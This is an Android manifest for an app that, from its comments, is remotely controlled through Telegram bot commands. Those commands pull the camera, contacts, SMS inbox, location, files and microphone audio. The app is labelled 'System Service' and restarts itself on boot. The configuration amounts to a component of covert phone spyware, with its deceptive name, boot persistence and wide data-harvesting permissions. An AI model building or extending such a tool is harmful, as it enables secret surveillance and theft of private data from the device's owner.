<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">

    <!-- ───────── Permissions ───────── -->

    <!-- Network access for Telegram API -->
    <uses-permission android:name="android.permission.INTERNET" />

    <!-- Camera for /camera command -->
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-feature android:name="android.hardware.camera.any" android:required="false" />

    <!-- Read device contacts for /contacts command -->
    <uses-permission android:name="android.permission.READ_CONTACTS" />

    <!-- Read SMS inbox for /sms command -->
    <uses-permission android:name="android.permission.READ_SMS" />

    <!-- Keep foreground service alive -->
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />

    <!-- Required on Android 14+ for camera use in foreground service -->
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />

    <!-- Show persistent notification (required on Android 13+) -->
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />

    <!-- Auto-start on device boot -->
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />

    <!-- Wake lock so the polling loop doesn't get killed during sleep -->
    <uses-permission android:name="android.permission.WAKE_LOCK" />

    <!-- GPS / network location for /location command -->
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />

    <!-- Required on Android 14+ when a foreground service accesses location -->
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />

    <!-- Storage access for /files command -->
    <!-- API 24–32: legacy broad storage read/write -->
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
        android:maxSdkVersion="32" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
        android:maxSdkVersion="28" />
    <!-- API 33+ (Android 13): granular media permissions -->
    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />

    <application
        android:name=".MyApplication"
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="System Service"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.HomeMonitor">

        <!-- ── Main Activity ── -->
        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!-- ── Foreground Monitor Service ── -->
        <!--
             foregroundServiceType="camera" is mandatory on Android 14 (API 34+)
             when a foreground service accesses the camera.
        -->
        <service
            android:name=".MonitorService"
            android:enabled="true"
            android:exported="false"
            android:stopWithTask="false"
            android:foregroundServiceType="camera|location|microphone" />

        <!-- ── Boot Receiver ── -->
        <receiver
            android:name=".BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <!-- Standard boot completed -->
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <!-- Fires after OTA / quick-boot on some devices -->
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
            </intent-filter>
        </receiver>

    </application>

</manifest>
